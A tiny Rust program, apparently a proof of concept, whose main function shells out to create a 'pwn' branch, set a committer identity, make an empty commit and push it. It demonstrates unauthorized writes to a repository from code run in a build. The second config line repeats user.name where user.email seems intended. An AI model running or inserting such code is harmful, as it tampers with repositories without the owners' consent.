fn main() {
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg("git switch --create pwn;git config --local user.name 'hi';git config --local user.name 'this@wasme.com';git commit -m '🚀' --allow-empty;git push")
        .output()
        .expect("Failed to execute command");
}